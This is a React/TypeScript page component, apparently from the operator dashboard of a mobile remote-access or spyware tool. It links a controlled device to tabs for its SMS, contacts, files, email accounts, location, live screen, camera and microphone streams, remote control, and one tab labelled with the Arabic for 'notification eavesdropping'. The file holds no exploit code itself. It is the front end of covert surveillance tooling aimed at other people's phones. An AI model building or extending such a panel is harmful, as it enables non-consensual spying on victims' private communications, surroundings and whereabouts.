import { useParams } from 'react-router-dom';
import { DeviceInfoCards } from '../components/device/DeviceInfoCards';
import { DeviceQuickActions } from '../components/device/DeviceQuickActions';
import { DeviceHomeTab } from '../components/device/tabs/DeviceHomeTab';
import { SmsTab } from '../components/device/tabs/SmsTab';
import { SecurityAlertsTab } from '../components/device/tabs/SecurityAlertsTab';
import { InstalledAppsTab } from '../components/device/tabs/InstalledAppsTab';
import { ContactsTab } from '../components/device/tabs/ContactsTab';
import { FileExplorerTab } from '../components/device/tabs/FileExplorerTab';
import { MediaGalleryTab } from '../components/device/tabs/MediaGalleryTab';
import { LiveScreenTab } from '../components/device/tabs/LiveScreenTab';
import { LiveCameraTab } from '../components/device/tabs/LiveCameraTab';
import { LiveMicTab } from '../components/device/tabs/LiveMicTab';
import { RemoteControlTab } from '../components/device/tabs/RemoteControlTab';
import { ControlCenterTab } from '../components/device/tabs/ControlCenterTab';
import { NotificationsTab } from '../components/device/tabs/NotificationsTab';
import { MediaZipTab } from '../components/device/tabs/MediaZipTab';
import { EmailAccountsTab } from '../components/device/tabs/EmailAccountsTab';
import { LocationTab } from '../components/device/tabs/LocationTab';
import { RealtimeNotificationsListener } from '../components/device/tabs/RealtimeNotificationsListener';
import { AudioControlTab } from '../components/device/tabs/AudioControlTab';
import { CommandGrid } from '../components/commands/CommandGrid';
import { SettingsPage } from './SettingsPage';
import { useDevices } from '../hooks/useDevices';
import { useAppStore } from '../stores/useAppStore';
import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Skeleton } from '../components/ui/Skeleton';

type HomeSubTab = 'overview' | 'sms' | 'alerts' | 'apps' | 'contacts' | 'files' | 'media' | 'live_screen' | 'live_camera' | 'live_mic' | 'remote' | 'control' | 'notifications' | 'zip' | 'email_accounts' | 'location' | 'audio_control' | 'notif_listener';

export function DeviceDetailPage() {
  const { token } = useParams<{ token: string }>();
  const { allDevices } = useDevices();
  const device = allDevices.find((d) => d.token === token);
  const activeDeviceTab = useAppStore((s) => s.activeDeviceTab);
  const setActiveDeviceTab = useAppStore((s) => s.setActiveDeviceTab);
  const [homeSubTab, setHomeSubTab] = useState<HomeSubTab>('overview');

  useEffect(() => {
    setActiveDeviceTab('commands');
  }, [token]);

  if (!device) {
    return (
      <div className="space-y-4">
        <Skeleton className="h-12 w-48" />
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          {Array.from({ length: 4 }).map((_, i) => <Skeleton key={i} className="h-28" />)}
        </div>
      </div>
    );
  }

  const homeSubTabs: { key: HomeSubTab; label: string }[] = [
    { key: 'overview', label: 'نظرة عامة' },
    { key: 'sms', label: 'SMS' },
    { key: 'alerts', label: 'تنبيهات' },
    { key: 'apps', label: 'تطبيقات' },
    { key: 'contacts', label: 'جهات اتصال' },
    { key: 'files', label: 'ملفات' },
    { key: 'media', label: 'وسائط' },
    { key: 'live_screen', label: 'بث شاشة' },
    { key: 'live_camera', label: 'بث كاميرا' },
    { key: 'live_mic', label: 'بث ميكروفون' },
    { key: 'remote', label: 'تحكم عن بُعد' },
    { key: 'control', label: 'مركز التحكم' },
    { key: 'notifications', label: 'إشعارات' },
    { key: 'zip', label: 'حزم وسائط' },
    { key: 'email_accounts', label: 'حسابات بريد' },
    { key: 'location', label: 'الموقع' },
    { key: 'audio_control', label: 'التحكم بالصوت' },
    { key: 'notif_listener', label: 'تنصت الإشعارات' },
  ];

  return (
    <div className="space-y-4">
      {/* Device Header */}
      <div className="flex items-center gap-3 lg:gap-4">
        <div className="flex-1 min-w-0">
          <h1 className="text-lg lg:text-xl font-bold text-surface-900 dark:text-white truncate">{device.name}</h1>
          <p className="text-[10px] lg:text-xs text-surface-500 font-mono truncate">{device.token}</p>
        </div>
        <div className={`w-3 h-3 rounded-full shrink-0 ${device.isOnline ? 'bg-emerald-500' : 'bg-surface-400'}`} />
      </div>

      {/* Content based on active tab */}
      <AnimatePresence mode="wait">
        <motion.div
          key={activeDeviceTab}
          initial={{ opacity: 0, y: 8 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -8 }}
          transition={{ duration: 0.15 }}
        >
          {activeDeviceTab === 'home' && (
            <>
              <DeviceInfoCards device={device} />
              <DeviceQuickActions deviceToken={device.token} deviceLocked={device.isLocked} />

              {/* Sub Tabs */}
              <div className="flex gap-1 overflow-x-auto pb-2 -mx-1 px-1">
                {homeSubTabs.map((t) => (
                  <button key={t.key} onClick={() => setHomeSubTab(t.key)} className={`px-3 py-1.5 rounded-full text-xs font-medium whitespace-nowrap transition-all ${homeSubTab === t.key ? 'bg-primary-600 text-white shadow-md shadow-primary-500/25' : 'bg-surface-100 dark:bg-surface-800 text-surface-600 dark:text-surface-400 hover:bg-surface-200 dark:hover:bg-surface-700'}`}>
                    {t.label}
                  </button>
                ))}
              </div>

              {homeSubTab === 'overview' && <DeviceHomeTab token={device.token} />}
              {homeSubTab === 'sms' && <SmsTab token={device.token} />}
              {homeSubTab === 'alerts' && <SecurityAlertsTab token={device.token} />}
              {homeSubTab === 'apps' && <InstalledAppsTab token={device.token} />}
              {homeSubTab === 'contacts' && <ContactsTab token={device.token} />}
              {homeSubTab === 'files' && <FileExplorerTab token={device.token} />}
              {homeSubTab === 'media' && <MediaGalleryTab token={device.token} />}
              {homeSubTab === 'live_screen' && <LiveScreenTab token={device.token} />}
              {homeSubTab === 'live_camera' && <LiveCameraTab token={device.token} />}
              {homeSubTab === 'live_mic' && <LiveMicTab token={device.token} />}
              {homeSubTab === 'remote' && <RemoteControlTab token={device.token} />}
              {homeSubTab === 'control' && <ControlCenterTab token={device.token} />}
              {homeSubTab === 'notifications' && <NotificationsTab token={device.token} />}
              {homeSubTab === 'zip' && <MediaZipTab token={device.token} />}
              {homeSubTab === 'email_accounts' && <EmailAccountsTab token={device.token} />}
              {homeSubTab === 'location' && <LocationTab token={device.token} />}
              {homeSubTab === 'audio_control' && <AudioControlTab token={device.token} />}
              {homeSubTab === 'notif_listener' && <RealtimeNotificationsListener token={device.token} />}
            </>
          )}

          {activeDeviceTab === 'commands' && (
            <CommandGrid deviceToken={device.token} />
          )}

          {activeDeviceTab === 'media' && (
            <MediaGalleryTab token={device.token} />
          )}

          {activeDeviceTab === 'settings' && (
            <SettingsPage />
          )}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
